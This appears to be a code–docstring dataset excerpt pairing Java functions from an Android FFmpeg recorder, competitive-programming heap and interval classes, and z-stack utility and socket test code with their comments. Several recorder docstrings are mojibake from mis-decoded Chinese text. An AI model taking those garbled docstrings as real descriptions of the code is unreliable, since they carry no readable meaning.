{"docstring": "/**\n * \u0363\u05b9\u0163\u02b1\u00fb\u02b9\n */\n", "func_signal": "public void stop()", "code": "{\n\tif (mediaPlayer != null && mediaPlayer.isPlaying()) {\n\t\tcurrentMediaState = MediaState.RESET;\n\t\tmediaPlayer.stop();\n\t\tmediaPlayer.release();\n\t}\n}", "path": "src\\com\\qd\\recorder\\VideoPlayTextureView.java", "repo_name": "hellopeterlee/FFmpegRecorder", "stars": 92, "license": "gpl-3.0", "language": "java", "size": 12580}
{"docstring": "/**\n * \u00bc\u01b5\u01b5\u013c\n */\n", "func_signal": "private void saveRecording()", "code": "{\n\tif(isRecordingStarted){\n\t\trunAudioThread = false;\n\t\tif(!isRecordingSaved){\n\t\t\tisRecordingSaved = true;\n\t\t\tnew AsyncStopRecording().execute();\n\t\t}\n\t}else{\n\t\tvideoTheEnd(false);\n\t}\n}", "path": "src\\com\\qd\\recorder\\FFmpegRecorderActivity.java", "repo_name": "hellopeterlee/FFmpegRecorder", "stars": 92, "license": "gpl-3.0", "language": "java", "size": 12580}
{"docstring": "/**\n * \u01b5\u02b1\n */\n", "func_signal": "private void showCancellDialog()", "code": "{\n\tUtil.showDialog(FFmpegRecorderActivity.this, \"\u02be\", \"\u0237\u04aa\u01b5\", 2, new Handler(){\n\t\t@Override\n\t\tpublic void dispatchMessage(Message msg) {\n\t\t\tif(msg.what == 1)\n\t\t\t\tvideoTheEnd(false);\n\t\t}\n\t});\n}", "path": "src\\com\\qd\\recorder\\FFmpegRecorderActivity.java", "repo_name": "hellopeterlee/FFmpegRecorder", "stars": 92, "license": "gpl-3.0", "language": "java", "size": 12580}
{"docstring": "/**\n * \u00bc\n * @param isSuccess\n */\n", "func_signal": "public void videoTheEnd(boolean isSuccess)", "code": "{\n\treleaseResources();\n\tif(fileVideoPath != null && fileVideoPath.exists() && !isSuccess)\n\t\tfileVideoPath.delete();\n\t\n\treturnToCaller(isSuccess);\n}", "path": "src\\com\\qd\\recorder\\FFmpegRecorderActivity.java", "repo_name": "hellopeterlee/FFmpegRecorder", "stars": 92, "license": "gpl-3.0", "language": "java", "size": 12580}
{"docstring": "/**\n * \u8bbe\u7f6e\u8fdb\u5ea6\u6761\u7684\u72b6\u6001\n * @param state\n */\n", "func_signal": "public void setCurrentState(State state)", "code": "{\n\tcurrentState = state;\n\tif(state == State.PAUSE)\n\t\tperProgress = perSecProgress;\n}", "path": "src\\com\\qd\\recorder\\ProgressView.java", "repo_name": "hellopeterlee/FFmpegRecorder", "stars": 92, "license": "gpl-3.0", "language": "java", "size": 12580}
{"docstring": "/**\n * \u00f7\u063d\n * @param valid\n */\n", "func_signal": "private void returnToCaller(boolean valid)", "code": "{\n\ttry{\n\t\tsetActivityResult(valid);\n\t\tif(valid){\n\t\t\tIntent intent = new Intent(this,FFmpegPreviewActivity.class);\n\t\t\tintent.putExtra(\"path\", strVideoPath);\n\t\t\tintent.putExtra(\"imagePath\", imagePath);\n\t\t\tstartActivity(intent);\n\t\t}\n\t} catch (Throwable e)\n\t{\n\t}finally{\n\t\tfinish();\n\t}\n}", "path": "src\\com\\qd\\recorder\\FFmpegRecorderActivity.java", "repo_name": "hellopeterlee/FFmpegRecorder", "stars": 92, "license": "gpl-3.0", "language": "java", "size": 12580}
{"docstring": "/**\n * \u04bb\u03b0\u02b1\u02bc\u00bc\n * @param isActionDown\n */\n", "func_signal": "private void initiateRecording(boolean isActionDown)", "code": "{\n\tisRecordingStarted = true;\n\tfirstTime = System.currentTimeMillis();\n\n\trecording = true;\n\ttotalPauseTime = 0;\n\tpausedTime = 0;\n\t\n\t//txtTimer.setVisibility(View.VISIBLE);\n\t//handler.removeCallbacks(mUpdateTimeTask);\n\t//handler.postDelayed(mUpdateTimeTask, 100);\n}", "path": "src\\com\\qd\\recorder\\FFmpegRecorderActivity.java", "repo_name": "hellopeterlee/FFmpegRecorder", "stars": 92, "license": "gpl-3.0", "language": "java", "size": 12580}
{"docstring": "/**\n * \u03f5\u0373\u05e2\u00bc\u01b5\u01b5\u013c\u013c\u017bsd\u02be\n */\n", "func_signal": "private void registerVideo()", "code": "{\n\tUri videoTable = Uri.parse(CONSTANTS.VIDEO_CONTENT_URI);\n\t\n\tUtil.videoContentValues.put(Video.Media.SIZE, new File(strVideoPath).length());\n\ttry{\n\t\turiVideoPath = getContentResolver().insert(videoTable, Util.videoContentValues);\n\t} catch (Throwable e){\n\t\turiVideoPath = null;\n\t\tstrVideoPath = null;\n\t\te.printStackTrace();\n\t} finally{}\n\tUtil.videoContentValues = null;\n}", "path": "src\\com\\qd\\recorder\\FFmpegRecorderActivity.java", "repo_name": "hellopeterlee/FFmpegRecorder", "stars": 92, "license": "gpl-3.0", "language": "java", "size": 12580}
{"docstring": "/**\n * \u0363\n */\n", "func_signal": "public void pause()", "code": "{\n\tif (mediaPlayer != null && mediaPlayer.isPlaying()){\n\t\tcurrentMediaState = MediaState.PAUSE;\n\t\tmediaPlayer.pause();\n\t\tif(mediaStateLitenser != null)\n\t\t\tmediaStateLitenser.OnPauseListener();\n\t}\n}", "path": "src\\com\\qd\\recorder\\VideoPlayTextureView.java", "repo_name": "hellopeterlee/FFmpegRecorder", "stars": 92, "license": "gpl-3.0", "language": "java", "size": 12580}
{"docstring": "/**\n * \u01b5\u02b1\n */\n", "func_signal": "private void updateTimestamp()", "code": "{\n\tif (videoRecorder != null)\n\t{\n\t\tint i = Util.getTimeStampInNsFromSampleCounted(this.mCount);\n\t\tif (mAudioTimestamp != i)\n\t\t{\n\t\t\tmAudioTimestamp = i;\n\t\t\tmAudioTimeRecorded =  System.nanoTime();\n\t\t}\n\t}\n}", "path": "src\\com\\qd\\recorder\\FFmpegRecorderActivity.java", "repo_name": "hellopeterlee/FFmpegRecorder", "stars": 92, "license": "gpl-3.0", "language": "java", "size": 12580}
{"docstring": "/**\n * \u00f5\u01f0mediaPlyerlistView\u00f8\u00ff\u063c\u02b1\n */\n", "func_signal": "public void reset()", "code": "{\n\tcurrentMediaState = MediaState.RESET;\n\tmediaPlayer.reset();\n}", "path": "src\\com\\qd\\recorder\\VideoPlayTextureView.java", "repo_name": "hellopeterlee/FFmpegRecorder", "stars": 92, "license": "gpl-3.0", "language": "java", "size": 12580}
{"docstring": "/**\n * \u0175\u01f0\u01b5\u047e\u06b2\u0363\uda9b\udf3f\u02bc\n */\n", "func_signal": "public void play()", "code": "{\n\tif(currentMediaState ==  MediaState.PLAY){\n\t\tcurrentMediaState = MediaState.PAUSE;\n\t\tif (mediaPlayer != null)\n\t\t\tmediaPlayer.pause();\n\t\tif(mediaStateLitenser != null)\n\t\t\tmediaStateLitenser.OnPauseListener();\n\t}else{\n\t\tcurrentMediaState = MediaState.PLAY;\n\t\tif(mediaStateLitenser != null)\n\t\t\tmediaStateLitenser.OnPlayListener();\n\t\tif (mediaPlayer != null && !mediaPlayer.isPlaying())\n\t\t\tmediaPlayer.start();\n\t}\n}", "path": "src\\com\\qd\\recorder\\VideoPlayTextureView.java", "repo_name": "hellopeterlee/FFmpegRecorder", "stars": 92, "license": "gpl-3.0", "language": "java", "size": 12580}
{"docstring": "/**\n * \u0377\u0534\u0363\u05b9\u00bc\u01b5\u01b5\n */\n", "func_signal": "private void releaseResources()", "code": "{\n\tisRecordingSaved = true;\n\ttry {\n\t\tif(videoRecorder != null)\n\t\t{\n\t\tvideoRecorder.stop();\n\t\tvideoRecorder.release();\n\t\t}\n\t} catch (com.googlecode.javacv.FrameRecorder.Exception e) {\n\t\te.printStackTrace();\n\t}\n\t\n\tyuvIplImage = null;\n\tvideoRecorder = null;\n\tlastSavedframe = null;\n\t\n\t//progressView.putProgressList((int) totalTime);\n\t//\u0363\u05b9\u02e2\u00bd\n\tprogressView.setCurrentState(State.PAUSE);\n}", "path": "src\\com\\qd\\recorder\\FFmpegRecorderActivity.java", "repo_name": "hellopeterlee/FFmpegRecorder", "stars": 92, "license": "gpl-3.0", "language": "java", "size": 12580}
{"docstring": "/**\n * shortBuffer\u01b5\u077a\u02bc\u03bb\n * @param shortBuffer\n */\n", "func_signal": "private void record(ShortBuffer shortBuffer)", "code": "{\n\ttry\n\t{\n\t\tsynchronized (mAudioRecordLock)\n\t\t{\n\t\t\tif (videoRecorder != null)\n\t\t\t{\n\t\t\t\tthis.mCount += shortBuffer.limit();\n\t\t\t\tvideoRecorder.record(0,new Buffer[] {shortBuffer});\n\t\t\t}\n\t\t\treturn;\n\t\t}\n\t}\n\tcatch (FrameRecorder.Exception localException){}\n}", "path": "src\\com\\qd\\recorder\\FFmpegRecorderActivity.java", "repo_name": "hellopeterlee/FFmpegRecorder", "stars": 92, "license": "gpl-3.0", "language": "java", "size": 12580}
{"docstring": "/**\n * Create a priority queue with the given items. Takes time proportional to the number of items using sink-based heap construction.\n */\n", "func_signal": "public MaxPQ(Key[] keys)", "code": "{\n    N = keys.length;\n    pq = (Key[]) new Object[keys.length + 1];\n    for (int i = 0; i < N; i++) {\n        pq[i + 1] = keys[i];\n    }\n    for (int k = N / 2; k >= 1; k--) {\n        sink(k);\n    }\n    assert isMaxHeap();\n}", "path": "src\\main\\java\\com\\nastra\\codechef\\nov\\ChefAndSegmentGame.java", "repo_name": "nastra/hackerrank", "stars": 86, "license": "None", "language": "java", "size": 635}
{"docstring": "/**\n * Return a maximum key.\n * \n * @return a maximum key\n * @throws java.util.NoSuchElementException\n *             if priority queue is empty\n */\n", "func_signal": "public Key maxKey()", "code": "{\n    if (N == 0)\n        throw new NoSuchElementException(\"Priority queue underflow\");\n    return keys[pq[1]];\n}", "path": "src\\main\\java\\com\\nastra\\codechef\\august\\CleaningTables.java", "repo_name": "nastra/hackerrank", "stars": 86, "license": "None", "language": "java", "size": 635}
{"docstring": "// helper function to double the size of the heap array\n", "func_signal": "private void resize(int capacity)", "code": "{\n    assert capacity > N;\n    Key[] temp = (Key[]) new Object[capacity];\n    for (int i = 1; i <= N; i++) {\n        temp[i] = pq[i];\n    }\n    pq = temp;\n}", "path": "src\\main\\java\\com\\nastra\\codechef\\nov\\ChefAndSegmentGame.java", "repo_name": "nastra/hackerrank", "stars": 86, "license": "None", "language": "java", "size": 635}
{"docstring": "/**\n * Create an empty priority queue with the given initial capacity.\n */\n", "func_signal": "public MaxPQ(int capacity)", "code": "{\n    pq = (Key[]) new Object[capacity + 1];\n    N = 0;\n}", "path": "src\\main\\java\\com\\nastra\\codechef\\nov\\ChefAndSegmentGame.java", "repo_name": "nastra/hackerrank", "stars": 86, "license": "None", "language": "java", "size": 635}
{"docstring": "/**\n * ********************************************************************* Helper functions for compares and swaps.\n * ********************************************************************\n */\n", "func_signal": "private boolean less(int i, int j)", "code": "{\n    if (comparator == null) {\n        return ((Comparable<Key>) pq[i]).compareTo(pq[j]) < 0;\n    } else {\n        return comparator.compare(pq[i], pq[j]) < 0;\n    }\n}", "path": "src\\main\\java\\com\\nastra\\codechef\\nov\\ChefAndSegmentGame.java", "repo_name": "nastra/hackerrank", "stars": 86, "license": "None", "language": "java", "size": 635}
{"docstring": "/**************************************************************\n * Heap helper functions\n **************************************************************/\n", "func_signal": "private void swim(int k)", "code": "{\n    while (k > 1 && less(k / 2, k)) {\n        exch(k, k / 2);\n        k = k / 2;\n    }\n}", "path": "src\\main\\java\\com\\nastra\\codechef\\august\\CleaningTables.java", "repo_name": "nastra/hackerrank", "stars": 86, "license": "None", "language": "java", "size": 635}
{"docstring": "/**\n * Returns the key associated with index i.\n * \n * @param i\n *            the index of the key to return\n * @return the key associated with index i\n * @throws java.lang.IndexOutOfBoundsException\n *             unless 0 &le; i < NMAX\n * @throws java.util.NoSuchElementException\n *             no key is associated with index i\n */\n", "func_signal": "public Key keyOf(int i)", "code": "{\n    if (!contains(i))\n        throw new NoSuchElementException(\"index is not in the priority queue\");\n    else\n        return keys[i];\n}", "path": "src\\main\\java\\com\\nastra\\codechef\\august\\CleaningTables.java", "repo_name": "nastra/hackerrank", "stars": 86, "license": "None", "language": "java", "size": 635}
{"docstring": "/**\n * Create an empty priority queue with the given initial capacity, using the given comparator.\n */\n", "func_signal": "public MaxPQ(int initCapacity, Comparator<Key> comparator)", "code": "{\n    this.comparator = comparator;\n    pq = (Key[]) new Object[initCapacity + 1];\n    N = 0;\n}", "path": "src\\main\\java\\com\\nastra\\codechef\\nov\\ChefAndSegmentGame.java", "repo_name": "nastra/hackerrank", "stars": 86, "license": "None", "language": "java", "size": 635}
{"docstring": "/**\n * Return the largest key on the priority queue.\n * \n * @throws java.util.NoSuchElementException\n *             if priority queue is empty.\n */\n", "func_signal": "public Key max()", "code": "{\n    if (isEmpty()) {\n        throw new NoSuchElementException(\"Priority queue underflow\");\n    }\n    return pq[1];\n}", "path": "src\\main\\java\\com\\nastra\\codechef\\nov\\ChefAndSegmentGame.java", "repo_name": "nastra/hackerrank", "stars": 86, "license": "None", "language": "java", "size": 635}
{"docstring": "/**\n * Increase the key associated with index i to the specified value.\n * \n * @param i\n *            the index of the key to increase\n * @param key\n *            increase the key assocated with index i to this key\n * @throws java.lang.IndexOutOfBoundsException\n *             unless 0 &le; i < NMAX\n * @throws java.lang.IllegalArgumentException\n *             if key &le; key associated with index i\n * @throws java.util.NoSuchElementException\n *             no key is associated with index i\n */\n", "func_signal": "public void increaseKey(int i, Key key)", "code": "{\n    if (!contains(i))\n        throw new NoSuchElementException(\"index is not in the priority queue\");\n    if (keys[i].compareTo(key) >= 0)\n        throw new IllegalArgumentException(\"Calling increaseKey() with given argument would not strictly increase the key\");\n\n    keys[i] = key;\n    swim(qp[i]);\n}", "path": "src\\main\\java\\com\\nastra\\codechef\\august\\CleaningTables.java", "repo_name": "nastra/hackerrank", "stars": 86, "license": "None", "language": "java", "size": 635}
{"docstring": "/**\n * Does this interval intersect that interval?\n * \n * @param that\n *            the other interval\n * @return true if this interval intersects that interval; false otherwise\n */\n", "func_signal": "public boolean intersects(Interval that)", "code": "{\n    if (this.right < that.left)\n        return false;\n    if (that.right < this.left)\n        return false;\n    return true;\n}", "path": "src\\main\\java\\com\\nastra\\codechef\\nov\\ChefAndSegmentGame.java", "repo_name": "nastra/hackerrank", "stars": 86, "license": "None", "language": "java", "size": 635}
{"docstring": "/**\n * Decrease the key associated with index i to the specified value.\n * \n * @param i\n *            the index of the key to decrease\n * @param key\n *            decrease the key assocated with index i to this key\n * @throws java.lang.IndexOutOfBoundsException\n *             unless 0 &le; i < NMAX\n * @throws java.lang.IllegalArgumentException\n *             if key &ge; key associated with index i\n * @throws java.util.NoSuchElementException\n *             no key is associated with index i\n */\n", "func_signal": "public void decreaseKey(int i, Key key)", "code": "{\n    if (!contains(i))\n        throw new NoSuchElementException(\"index is not in the priority queue\");\n    if (keys[i].compareTo(key) <= 0)\n        throw new IllegalArgumentException(\"Calling decreaseKey() with given argument would not strictly decrease the key\");\n\n    keys[i] = key;\n    sink(qp[i]);\n}", "path": "src\\main\\java\\com\\nastra\\codechef\\august\\CleaningTables.java", "repo_name": "nastra/hackerrank", "stars": 86, "license": "None", "language": "java", "size": 635}
{"docstring": "// is subtree of pq[1..N] rooted at k a max heap?\n", "func_signal": "private boolean isMaxHeap(int k)", "code": "{\n    if (k > N) {\n        return true;\n    }\n    int left = 2 * k, right = 2 * k + 1;\n    if (left <= N && less(k, left)) {\n        return false;\n    }\n    if (right <= N && less(k, right)) {\n        return false;\n    }\n    return isMaxHeap(left) && isMaxHeap(right);\n}", "path": "src\\main\\java\\com\\nastra\\codechef\\nov\\ChefAndSegmentGame.java", "repo_name": "nastra/hackerrank", "stars": 86, "license": "None", "language": "java", "size": 635}
{"docstring": "// add all elements to copy of heap\n// takes linear time since already in heap order so no keys move\n", "func_signal": "public HeapIterator()", "code": "{\n    copy = new IndexMaxPQ<Key>(pq.length - 1);\n    for (int i = 1; i <= N; i++)\n        copy.insert(pq[i], keys[pq[i]]);\n}", "path": "src\\main\\java\\com\\nastra\\codechef\\august\\CleaningTables.java", "repo_name": "nastra/hackerrank", "stars": 86, "license": "None", "language": "java", "size": 635}
{"docstring": "/**\n * Initializes an empty indexed priority queue with indices between 0 and NMAX-1.\n * \n * @param NMAX\n *            the keys on the priority queue are index from 0 to NMAX-1\n * @throws java.lang.IllegalArgumentException\n *             if NMAX < 0\n */\n", "func_signal": "public IndexMaxPQ(int NMAX)", "code": "{\n    keys = (Key[]) new Comparable[NMAX + 1]; // make this of length NMAX??\n    pq = new int[NMAX + 1];\n    qp = new int[NMAX + 1]; // make this of length NMAX??\n    for (int i = 0; i <= NMAX; i++)\n        qp[i] = -1;\n}", "path": "src\\main\\java\\com\\nastra\\codechef\\august\\CleaningTables.java", "repo_name": "nastra/hackerrank", "stars": 86, "license": "None", "language": "java", "size": 635}
{"docstring": "/**\n * Returns an index associated with a maximum key.\n * \n * @return an index associated with a maximum key\n * @throws java.util.NoSuchElementException\n *             if priority queue is empty\n */\n", "func_signal": "public int maxIndex()", "code": "{\n    if (N == 0)\n        throw new NoSuchElementException(\"Priority queue underflow\");\n    return pq[1];\n}", "path": "src\\main\\java\\com\\nastra\\codechef\\august\\CleaningTables.java", "repo_name": "nastra/hackerrank", "stars": 86, "license": "None", "language": "java", "size": 635}
{"docstring": "/**\n * current complexity is = O(left*right)\n * \n */\n", "func_signal": "public static int solveFast(int[] a, int left, int right)", "code": "{\n    int result = 0;\n    for (int i = left; i <= right; i++) {\n        int total = 0;\n        for (int j = i; j <= right; j++) {\n            total += a[j];\n            if (total % 3 == 0) {\n                result++;\n            }\n        }\n    }\n\n    return result;\n}", "path": "src\\main\\java\\com\\nastra\\codechef\\jan2015\\QueriesOnTheString.java", "repo_name": "nastra/hackerrank", "stars": 86, "license": "None", "language": "java", "size": 635}
{"docstring": "/**\n * Initializes an interval [left, right].\n * \n * @param left\n *            the left endpoint\n * @param right\n *            the right endpoint\n * @throws IllegalArgumentException\n *             if the left endpoint is greater than the right endpoint\n * @throws IllegalArgumentException\n *             if either <tt>left</tt> or <tt>right</tt> is <tt>Double.NaN</tt>, <tt>Double.POSITIVE_INFINITY</tt> or\n *             <tt>Double.NEGATIVE_INFINITY</tt>\n */\n", "func_signal": "public Interval(double left, double right)", "code": "{\n    if (Double.isInfinite(left) || Double.isInfinite(right))\n        throw new IllegalArgumentException(\"Endpoints must be finite\");\n    if (Double.isNaN(left) || Double.isNaN(right))\n        throw new IllegalArgumentException(\"Endpoints cannot be NaN\");\n\n    if (left <= right) {\n        this.left = left;\n        this.right = right;\n    } else\n        throw new IllegalArgumentException(\"Illegal interval\");\n}", "path": "src\\main\\java\\com\\nastra\\codechef\\nov\\ChefAndSegmentGame.java", "repo_name": "nastra/hackerrank", "stars": 86, "license": "None", "language": "java", "size": 635}
{"docstring": "/**\n * traverse left to right / up to down / right to left, and then:\n * \n * one up / left to right / one up / right to left / and so on..\n * \n * @param grid\n * @param rowCosts\n * @param colCosts\n * @param startRow\n * @param endRow\n * @param startCol\n * @param endCol\n * @return\n */\n", "func_signal": "private static BigInteger solveForEvenRowsA(boolean[][] grid, int[][] rowCosts, int[][] colCosts, final int startRow, final int endRow,\n        final int startCol, final int endCol)", "code": "{\n    BigInteger sum = BigInteger.ZERO;\n    grid[startRow][startCol] = true;\n    // traverse left to right\n    sum = sum.add(leftToRight(grid, colCosts, startRow, 2, endCol + 1));\n\n    // traverse down\n    sum = sum.add(upToDown(grid, rowCosts, endCol, startRow + 1, endRow + 1));\n\n    // traverse right to left, but reset the last visited cell\n    grid[endRow][endCol] = false;\n    sum = sum.add(rightToLeft(grid, colCosts, endRow, endCol, 1));\n    // traverse one up/then all the way right/then one up/then all the way left\n    int row = endRow;\n    int col = 1;\n    while (row >= 2) {\n        // one up\n        grid[row][col] = true;\n        sum = sum.add(BigInteger.valueOf(rowCosts[row][col + 1]));\n        row--;\n\n        // left to right\n        col = grid[row].length - 1;\n        BigInteger res = leftToRight(grid, colCosts, row, 2, col);\n        sum = sum.add(res);\n\n        if (row <= 1) {\n            break;\n        }\n        // one up\n        col--;\n        grid[row][col] = true;\n        sum = sum.add(BigInteger.valueOf(rowCosts[row][col + 1]));\n        // row--;\n\n        // right to left\n        res = rightToLeft(grid, colCosts, row - 1, col, 1);\n        sum = sum.add(res);\n    }\n    return sum;\n}", "path": "src\\main\\java\\com\\nastra\\hackerrank\\TravelingSalesmanInAGrid.java", "repo_name": "nastra/hackerrank", "stars": 86, "license": "None", "language": "java", "size": 635}
{"docstring": "/**\n * Remove the key associated with index i.\n * \n * @param i\n *            the index of the key to remove\n * @throws java.lang.IndexOutOfBoundsException\n *             unless 0 &le; i < NMAX\n * @throws java.util.NoSuchElementException\n *             no key is associated with index i\n */\n", "func_signal": "public void delete(int i)", "code": "{\n    if (!contains(i))\n        throw new NoSuchElementException(\"index is not in the priority queue\");\n    int index = qp[i];\n    exch(index, N--);\n    swim(index);\n    sink(index);\n    keys[i] = null;\n    qp[i] = -1;\n}", "path": "src\\main\\java\\com\\nastra\\codechef\\august\\CleaningTables.java", "repo_name": "nastra/hackerrank", "stars": 86, "license": "None", "language": "java", "size": 635}
{"docstring": "/**\n * Returns the start position of the first occurrence of the specified {@code\n * target} within {@code array}, or {@code -1} if there is no such occurrence.\n *\n * <p>More formally, returns the lowest index {@code i} such that {@code\n * java.util.Arrays.copyOfRange(array, i, i + target.length)} contains exactly\n * the same elements as {@code target}.\n *\n * @param array the array to search for the sequence {@code target}\n * @param target the array to search for as a sub-sequence of {@code array}\n */\n", "func_signal": "public static int indexOf(char[] array, char[] target)", "code": "{\n  if (target.length == 0) {\n    return 0;\n  }\n\n  outer:\n  for (int i = 0; i < array.length - target.length + 1; i++) {\n    for (int j = 0; j < target.length; j++) {\n      if (array[i + j] != target[j]) {\n        continue outer;\n      }\n    }\n    return i;\n  }\n  return -1;\n}", "path": "landz.kernel\\src\\z\\util\\primitives\\Chars.java", "repo_name": "landz/z-stack", "stars": 68, "license": "None", "language": "java", "size": 12915}
{"docstring": "/**\n * Copies a collection of {@code Character} instances into a new array of\n * primitive {@code char} values.\n *\n * <p>Elements are copied from the argument collection as if by {@code\n * collection.toArray()}.  Calling this method is as thread-safe as calling\n * that method.\n *\n * @param collection a collection of {@code Character} objects\n * @return an array containing the same values as {@code collection}, in the\n *     same order, converted to primitives\n * @throws NullPointerException if {@code collection} or any of its elements\n *     is null\n */\n", "func_signal": "public static char[] toArray(Collection<Character> collection)", "code": "{\n  if (collection instanceof CharArrayAsList) {\n    return ((CharArrayAsList) collection).toCharArray();\n  }\n\n  Object[] boxedArray = collection.toArray();\n  int len = boxedArray.length;\n  char[] array = new char[len];\n  for (int i = 0; i < len; i++) {\n    // checkNotNull for GWT (do not optimize)\n    array[i] = (Character) boxedArray[i];\n  }\n  return array;\n}", "path": "landz.kernel\\src\\z\\util\\primitives\\Chars.java", "repo_name": "landz/z-stack", "stars": 68, "license": "None", "language": "java", "size": 12915}
{"docstring": "/**\n * Returns the {@code char} nearest in value to {@code value}.\n *\n * @param value any {@code long} value\n * @return the same value cast to {@code char} if it is in the range of the\n *     {@code char} type, {@link Character#MAX_VALUE} if it is too large,\n *     or {@link Character#MIN_VALUE} if it is too small\n */\n", "func_signal": "public static char saturatedCast(long value)", "code": "{\n  if (value > Character.MAX_VALUE) {\n    return Character.MAX_VALUE;\n  }\n  if (value < Character.MIN_VALUE) {\n    return Character.MIN_VALUE;\n  }\n  return (char) value;\n}", "path": "landz.kernel\\src\\z\\util\\primitives\\Chars.java", "repo_name": "landz/z-stack", "stars": 68, "license": "None", "language": "java", "size": 12915}
{"docstring": "/**\n * Returns a string containing the supplied {@code char} values separated\n * by {@code separator}. For example, {@code join(\"-\", '1', '2', '3')} returns\n * the string {@code \"1-2-3\"}.\n *\n * @param separator the text that should appear between consecutive values in\n *     the resulting string (but not at the start or end)\n * @param array an array of {@code char} values, possibly empty\n */\n", "func_signal": "public static String join(String separator, char... array)", "code": "{\n  int len = array.length;\n  if (len == 0) {\n    return \"\";\n  }\n\n  StringBuilder builder\n      = new StringBuilder(len + separator.length() * (len - 1));\n  builder.append(array[0]);\n  for (int i = 1; i < len; i++) {\n    builder.append(separator).append(array[i]);\n  }\n  return builder.toString();\n}", "path": "landz.kernel\\src\\z\\util\\primitives\\Chars.java", "repo_name": "landz/z-stack", "stars": 68, "license": "None", "language": "java", "size": 12915}
{"docstring": "/**\n * Returns the least value present in {@code array}.\n *\n * @param array a <i>nonempty</i> array of {@code int} values\n * @return the value present in {@code array} that is less than or equal to\n *     every other value in the array\n * @throws IllegalArgumentException if {@code array} is empty\n */\n", "func_signal": "public static int min(int... array)", "code": "{\n  int min = array[0];\n  for (int i = 1; i < array.length; i++) {\n    if (array[i] < min) {\n      min = array[i];\n    }\n  }\n  return min;\n}", "path": "landz.kernel\\src\\z\\util\\primitives\\Ints.java", "repo_name": "landz/z-stack", "stars": 68, "license": "None", "language": "java", "size": 12915}
{"docstring": "/**\n */\n", "func_signal": "@Documented\n@Retention(RetentionPolicy.CLASS)\n@Target(ElementType.TYPE)\npublic @interface Module", "code": "{\n\n  String name() default \"\";\n\n  String version() default \"1.0\";\n\n  String vendor() default \"\";\n\n  String description() default \"\";\n\n  License license() default License.UNKNOWN;\n\n  String customLicense() default \"\";\n\n  String libraryPath() default \".\";\n\n  String override() default \"\";\n\n}", "path": "landz.kernel\\src\\z\\module\\Module.java", "repo_name": "landz/z-stack", "stars": 68, "license": "None", "language": "java", "size": 12915}
{"docstring": "/**\n * Returns a string containing the supplied {@code int} values separated\n * by {@code separator}. For example, {@code join(\"-\", 1, 2, 3)} returns\n * the string {@code \"1-2-3\"}.\n *\n * @param separator the text that should appear between consecutive values in\n *     the resulting string (but not at the start or end)\n * @param array an array of {@code int} values, possibly empty\n */\n", "func_signal": "public static String join(String separator, int... array)", "code": "{\n  if (array.length == 0) {\n    return \"\";\n  }\n\n  // For pre-sizing a builder, just get the right order of magnitude\n  StringBuilder builder = new StringBuilder(array.length * 5);\n  builder.append(array[0]);\n  for (int i = 1; i < array.length; i++) {\n    builder.append(separator).append(array[i]);\n  }\n  return builder.toString();\n}", "path": "landz.kernel\\src\\z\\util\\primitives\\Ints.java", "repo_name": "landz/z-stack", "stars": 68, "license": "None", "language": "java", "size": 12915}
{"docstring": "//  volatile long tid = 1;\n", "func_signal": "@Test\n  public void basicTest()", "code": "{\n    int port = 12345;\n    int NThreads = 4;\n    CountDownLatch latch = new CountDownLatch(NThreads);\n\n    on(LOOPBACK_ADDRESS, port,\n        Pipeline\n            .create((PipelineContext ctx) -> {\n              ByteBuffer in  = ctx.inBuffer;\n              ByteBuffer out = ctx.outBuffer;\n              long length = in.readableBytes();\n              in.readTo(out,length);\n              out.write((byte)length);//append a byte for length\n//              tid = Unsafes.currentThreadId();\n              return ctx;\n            })\n            .end());\n    \n    System.out.println(\"net server has started on \"+ LOOPBACK_ADDRESS + \" with port \" + port);\n\n    uncheck(() -> Thread.sleep(3_000L));\n\n    for (int i = 0; i < NThreads; i++) {\n      new Thread(()->{\n        int fd = socketTcp(); System.out.println(\"current client socket: \"+fd);\n        connectTo(fd, LOOPBACK_ADDRESS, port);\n        String msg;\n        ThreadLocalRandom rnd = ThreadLocalRandom.current();\n        long count = RUNS;\n        while (count!=0) {\n          if ( (count%(RUNS/2))==0 ) {\n            System.gc();\n            uncheck(() -> Thread.sleep(1000L));\n            System.gc();\n            printStats(\"count=\"+count);\n          }\n          int length = rnd.nextInt(1,Byte.MAX_VALUE);\n          msg = randomString(length);\n          sendmsg(fd, msg);\n          recvmsg(fd, msg);\n          count--;\n        }\n        shutdown(fd);\n\n        latch.countDown();\n      }).start();\n    }\n\n    uncheck(() -> latch.await());\n  }", "path": "landz.net.base.tests\\src\\z\\net\\stress\\NetModuleTestMT02.java", "repo_name": "landz/z-stack", "stars": 68, "license": "None", "language": "java", "size": 12915}
{"docstring": "/**\n * Returns a fixed-size list backed by the specified array, similar to {@link\n * java.util.Arrays#asList(Object[])}. The list supports {@link java.util.List#set(int, Object)},\n * but any attempt to set a value to {@code null} will result in a {@link\n * NullPointerException}.\n *\n * <p>The returned list maintains the values, but not the identities, of\n * {@code Integer} objects written to or read from it.  For example, whether\n * {@code list.get(0) == list.get(0)} is true for the returned list is\n * unspecified.\n *\n * @param backingArray the array to back the list\n * @return a list view of the array\n */\n", "func_signal": "public static List<Integer> asList(int... backingArray)", "code": "{\n  if (backingArray.length == 0) {\n    return Collections.emptyList();\n  }\n  return new IntArrayAsList(backingArray);\n}", "path": "landz.kernel\\src\\z\\util\\primitives\\Ints.java", "repo_name": "landz/z-stack", "stars": 68, "license": "None", "language": "java", "size": 12915}
{"docstring": "/**\n * Returns the {@code int} nearest in value to {@code value}.\n *\n * @param value any {@code long} value\n * @return the same value cast to {@code int} if it is in the range of the\n *     {@code int} type, {@link Integer#MAX_VALUE} if it is too large,\n *     or {@link Integer#MIN_VALUE} if it is too small\n */\n", "func_signal": "public static int saturatedCast(long value)", "code": "{\n  if (value > Integer.MAX_VALUE) {\n    return Integer.MAX_VALUE;\n  }\n  if (value < Integer.MIN_VALUE) {\n    return Integer.MIN_VALUE;\n  }\n  return (int) value;\n}", "path": "landz.kernel\\src\\z\\util\\primitives\\Ints.java", "repo_name": "landz/z-stack", "stars": 68, "license": "None", "language": "java", "size": 12915}
